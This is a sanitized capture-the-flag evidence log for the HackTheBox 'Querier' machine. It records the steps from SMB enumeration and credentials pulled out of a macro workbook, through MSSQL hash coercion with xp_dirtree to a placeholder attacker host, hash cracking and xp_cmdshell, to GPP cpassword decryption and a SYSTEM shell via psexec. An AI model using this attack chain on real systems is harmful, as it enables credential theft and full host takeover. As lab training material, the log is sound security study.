# HTB: Querier (SMB/MSSQL/GPP) — Evidence (Sanitized, text-only)

Timestamp (UTC): <YYYY-MM-DD HH:MM:SS UTC>
Environment: Linux <host> <kernel_version> #1 SMP <date> <arch>
Tool versions:
- Nmap 7.94SVN
- smbclient
- impacket (mssqlclient, psexec)
- Responder
- John the Ripper / hashcat

# VPN / Reachability
sudo openvpn <vpn_name>.ovpn
ping <TARGET_IP>

# Scans (commands + sanitized outputs)
sudo nmap -p- -sV -sC <TARGET_IP>
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
1433/tcp open  ms-sql-s      Microsoft SQL Server
5985/tcp open  http          WinRM
# ms-sql-ntlm-info → Domain: HTB.LOCAL

# SMB (sanitized)
smbclient -N -L //<TARGET_IP>/
# Reports share readable
smbclient -N //<TARGET_IP>/Reports    # get Currency Volume Report.xlsm

# Credential access (sanitized)
unzip 'Currency Volume Report.xlsm'
strings xl/vbaProject.bin
# Uid=reporting; Pwd=<REDACTED>

# Hash coercion (sanitized)
impacket-mssqlclient reporting@<TARGET_IP> -windows-auth
SQL> EXEC xp_dirtree '\\<ATTACKER_IP>\share\file'
# Responder → NetNTLMv2 for QUERIER\mssql-svc → cracked (<REDACTED>)

# Foothold (sanitized)
impacket-mssqlclient mssql-svc@<TARGET_IP> -windows-auth
SQL> EXEC xp_cmdshell 'whoami'
querier\mssql-svc

# Privilege escalation (sanitized)
# PowerUp Invoke-AllChecks → cached Groups.xml → cpassword decrypt → Administrator
psexec.py administrator@<TARGET_IP>
whoami
nt authority\system

# Notes
- Replace placeholders <TARGET_IP>, <ATTACKER_IP>.
- Do not include flags/credentials; keep sensitive values as <REDACTED>.
